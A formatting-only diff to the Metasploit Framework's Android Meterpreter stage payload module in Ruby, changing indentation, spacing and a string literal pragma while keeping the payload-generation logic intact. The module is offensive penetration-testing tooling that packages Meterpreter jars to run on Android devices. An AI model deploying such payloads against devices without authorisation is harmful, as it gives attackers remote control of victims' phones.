@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -10,30 +11,28 @@ require 'msf/base/sessions/meterpreter_options'
 require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
-
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Android Meterpreter',
-      'Description' => 'Run a meterpreter server on Android',
-      'Author'      => ['mihi', 'egypt', 'anwarelmakrahy', 'OJ Reeves'],
-      'Platform'    => 'android',
-      'Arch'        => ARCH_DALVIK,
-      'License'     => MSF_LICENSE,
-      'Session'     => Msf::Sessions::Meterpreter_Java_Android
-    ))
+                      'Name'        => 'Android Meterpreter',
+                      'Description' => 'Run a meterpreter server on Android',
+                      'Author'      => ['mihi', 'egypt', 'anwarelmakrahy', 'OJ Reeves'],
+                      'Platform'    => 'android',
+                      'Arch'        => ARCH_DALVIK,
+                      'License'     => MSF_LICENSE,
+                      'Session'     => Msf::Sessions::Meterpreter_Java_Android))
 
     register_options([
-      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
-    ], self.class)
+                       OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
+                     ], self.class)
   end
 
   #
   # Override the Payload::Android version so we can load a prebuilt jar to be
   # used as the final stage
   #
-  def generate_stage(opts={})
+  def generate_stage(opts = {})
     clazz = 'androidpayload.stage.Meterpreter'
     metstage = MetasploitPayloads.read("android", "metstage.jar")
     met = MetasploitPayloads.read("android", "meterpreter.jar")
@@ -50,7 +49,7 @@ module MetasploitModule
     (blocks + [blocks.length]).pack('A*' * blocks.length + 'N')
   end
 
-  def generate_config(opts={})
+  def generate_config(opts = {})
     opts[:uuid] ||= generate_payload_uuid
 
     # create the configuration block, which for staged connections is really simple.
